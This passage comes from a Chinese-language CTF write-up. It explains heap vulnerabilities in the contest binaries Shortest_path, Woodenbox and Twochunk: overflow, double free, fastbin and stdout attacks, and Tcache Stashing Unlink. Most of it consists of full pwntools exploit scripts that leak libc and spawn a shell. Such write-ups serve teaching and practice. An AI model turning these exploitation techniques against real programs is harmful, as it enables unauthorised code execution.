class="number">3</span></span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0x602034</span>) + p64(<span class="number">0x30</span>) + p64(libc.sym[<span class="string">&#x27;__environ&#x27;</span>])+b<span class="string">&quot;\n&quot;</span>) #<span class="number">5</span></span><br><span class="line">edit(<span class="number">1</span>, p32(<span class="number">0</span>)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">stack_address = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=True).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.format(hex(stack_address)))</span><br><span class="line"></span><br><span class="line">ret_address = stack_address - <span class="number">0x70</span></span><br><span class="line">edit(<span class="number">5</span>, p64(<span class="number">0x602034</span>) + p64(<span class="number">0x80</span>) + p64(ret_address) + b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc.address + <span class="number">0x14862</span></span><br><span class="line">get_shell = flat([</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    libc.search(b<span class="string">&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">])</span><br><span class="line">edit(<span class="number">2</span>, get_shell+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Shortest-path"><a href="#Shortest-path" class="headerlink" title="Shortest_path"></a>Shortest_path</h2><p><code>flag</code>被加载到了两个位置，一个是全局变量处，一个是<code>top chunk</code>的堆地址处</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810180954.png" alt="图片无法显示，请联系作者" title=" "><p>持续不断地分配<code>chunk</code>，使得<code>flag</code>落到<code>name</code>字段的位置就可以输出<code>flag</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Shortest_path&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x401475&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, price, length, name, connected=<span class="number">0</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;options ---&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station ID: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Price: &quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Name Length: &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station Name: \n&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;connected station: &quot;</span>, <span class="built_in">str</span>(connected))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qurey_station</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;options ---&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Station ID: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ac2240 - ac2000  0x240</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x0</span>, <span class="number">0xd7</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xf</span>) <span class="comment"># 0x20 + 0xe0</span></span><br><span class="line">qurey_station(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Woodenbox"><a href="#Woodenbox" class="headerlink" title="Woodenbox"></a>Woodenbox</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>程序存在明显的堆溢出漏洞，并且退出时执行的是<code>double free</code>，这很明显是要写入<code>one_gadget</code>。需要注意的是程序没有输出，而且每次删除堆块之后链表都会向前移动一位，即<code>buf_list[0]</code>会消失。</p><h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><ul><li><p>首先申请一个较大的<code>unsorted bin</code>并释放使得堆块中残留有<code>mainarena+88</code>的地址，依次使用两个<code>fastbin</code>堆块申请，那么最后一个申请的<code>fastbin</code>中就会存在<code>mainarena+88</code>的地址数据，我们将其低两位覆写为<code>stderr+157</code>地址的低两位<code>\x65\xdd</code>，（这里需要爆破<code>16bit</code>）</p></li><li><p>此时我们申请<code>fastbin</code>堆块并释放，利用堆溢出将<code>fastbin-&gt;fd</code>指针的低<code>1</code>字节改写为保存有<code>stderr+157</code>地址的<code>fasbin</code>堆块地址形成下列结构</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810222806.png" alt="图片无法显示，请联系作者" title=" "><p>那么此时我们连续申请三个<code>fastbin</code>堆块，就可以将<code>stderr+157</code>处伪造的堆块申请到，进而可以控制<code>stdout</code>结构体</p></li><li><p>修改<code>stdout</code>结构体的<code>flag</code>和<code>io_wite_base</code>泄露<code>stdout</code>结构体附近地址，得到<code>libc</code>基址</p></li><li><p>再次利用<code>fastbin attack</code>将<code>malloc_hook</code>改写为<code>one_gadget</code>地址，<code>getshell</code></p></li></ul><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># encoding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./woodenbox2&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x555555555041&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xcb7c5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;, 0)</span></span><br><span class="line"><span class="string">    libc = ELF(&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    one_gadget = 0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def add(length, content=&quot;12&quot;):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;length of item name:&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;name of item:&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def change(index, length, content):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the index of item:&quot;, str(index))</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the length of item name:&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;new name of the item:&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def remove(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;the index of item:&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def double_free():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x60)  # 0</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x90)</span></span><br><span class="line"><span class="string">add(0x60)  # 4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">remove(2)</span></span><br><span class="line"><span class="string">add(0x20)  # 1</span></span><br><span class="line"><span class="string">add(0x60, &quot;\xdd\x65&quot;)  # 4</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">remove(4)</span></span><br><span class="line"><span class="string">remove(4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">change(0, 0x300, cyclic(0x68) + p64(0x71) + cyclic(0x68) + p64(0x71) + b&quot;\x10&quot;)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60, b&quot;\x00&quot; * 3 + p64(0) * 0x6 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + b&quot;\x00&quot;)</span></span><br><span class="line"><span class="string">p.recv(0x40)</span></span><br><span class="line"><span class="string">libc.address = u64(p.recv(6).ljust(8, b&quot;\x00&quot;)) + 0x20 - libc.sym[&#x27;</span>_IO_2_1_stdout_<span class="number">&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">2</span>, <span class="number">0x10</span>, p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>, b<span class="string">&quot;\x00&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget + libc.address))</span><br><span class="line">double_free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Twochunk"><a href="#Twochunk" class="headerlink" title="Twochunk"></a>Twochunk</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>首先我们先分析一下程序，首先在<code>0x23333000</code>地址处<code>mmap</code>了一块内存的地址，并提供了七种操作。</p><p><code>add</code>函数中，根据用户的输入分配相应大小的内存，但是我们最多可以保存分配得到的两个堆块指针，若用户输入的大小为<code>23333</code>则调用<code>malloc</code>分配固定的<code>0xe9</code>大小，否则调用<code>calloc</code>分配用户申请的大小。</p><p><code>edit</code>函数中，我们注意到其可以进行<code>0x20</code>字节大小的溢出，并且如果用户输入的是<code>23333</code>则可以进行大范围的堆溢出。</p><p>有一次<code>malloc(0x88)</code>的机会，能够对<code>mmap_address</code>中指定的地址进行函数调用</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200812135039.png" alt="图片无法显示，请联系作者" title=" "><h3 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h3><p>只要我们可以将<code>mmap_address</code>处改写为<code>system</code>地址，<code>mmap_address+0x30</code>处改写为<code>/bin/sh\x00</code>的地址就可以<code>getshell</code>。但是<code>mmap_address</code>处的内容是程序一开始就需要输入的，因此我们需要将<code>chunk</code>分配到<code>mmap_address</code>处。这就需要利用<code>Tcache Stashing Unlink</code>。</p><ul><li><p>在<code>small bin</code>中构造两个<code>0x90</code>大小的<code>chunk</code>。构造两个<code>small bin chunk</code>可以首先构造两个相对较大的<code>unsorted bin</code>，之后经过两次分配，分割剩余的<code>0x90</code>进入<code>small bin</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0xe9</span>) <span class="comment"># 进行溢出的chunk</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x130</span>)<span class="comment"># unsorted bin 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>)<span class="comment"># padding to tcache</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x130</span>)<span class="comment"># unsorted bin 2</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 0x140 chunk 1 to small bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x140</span>)<span class="comment"># padding to tcache</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xe9</span>)<span class="comment"># 0x40 chunk 1 to unsorted bin，对small bin中的chunk进行换序</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x140 chunk2 to unsorted bin: 0x140chunk2&lt;--&gt;0x40</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment"># merge 0x40, 0x100 chunk to 0x140 chunk 1, put to unsorted bin: 0x140chunk1&lt;--&gt;0x140 chunk2</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xa8</span>)<span class="comment"># 0x140 chunk1 to small bin, 0x90 chunk2 in unsorted bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xa8</span>)<span class="comment"># 0x90 chunk2 to small bin, 0x90 chunk1 in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment"># clear pointer buf</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x150</span>)<span class="comment"># small bin: 0x90chunk1&lt;--&gt;0x90chunk2</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>malloc</code>申请一块<code>0x100</code>的<code>tcache</code>，此时可以泄露堆地址</p></li><li><p>覆写<code>chunk1</code>的<code>bk</code>指针为<code>mmap_address-0x10</code>，<code>calloc(0x88)</code>即可将<code>mmap_address</code>加入<code>tcache</code>，此时可以泄露<code>libc</code>基址</p></li><li><p>调用<code>leave_end_message</code>使用<code>malloc(0x88)</code>即可以分配到<code>mmap_address</code>，布局<code>system</code>函数和参数，<code>getshell</code></p></li></ul><h4 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./twochunk&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.30/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_message_name</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_end_message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;end message: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_mmap</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_address = <span class="number">0x23333000</span></span><br><span class="line"></span><br><span class="line">name = p64(mmap_address + <span class="number">0x30</span> - <span class="number">0x10</span>)*<span class="number">6</span></span><br><span class="line">message = p64(mmap_address)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your name: &quot;</span>, name)</span><br><span class="line">p.sendafter(<span class="string">&quot;your message: &quot;</span>, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x130</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xe9</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x55555555596E&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xe9</span>)<span class="comment"># overwrite address</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x130</span>)<span class="comment"># first 0x90 chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x130</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x140</span>) <span class="comment">#0x140 chunk1 to small bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xe9</span>) <span class="comment">#0x40 chunk in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x140 chunk2 in unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xa8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x150</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">23333</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">heap_address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) + <span class="number">0x100</span></span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xf8</span>) + p64(<span class="number">0xb1</span>) + cyclic(<span class="number">0xa8</span>)</span><br><span class="line">payload += p64(<span class="number">0x91</span>) + p64(heap_address + <span class="number">0x3f0</span>) +p64(mmap_address-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">show_message_name()</span><br><span class="line">p.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">224</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">payload = p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]).ljust(<span class="number">0x30</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(mmap_address + <span class="number">0x48</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">leave_end_message(payload)</span><br><span class="line">call_mmap()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" 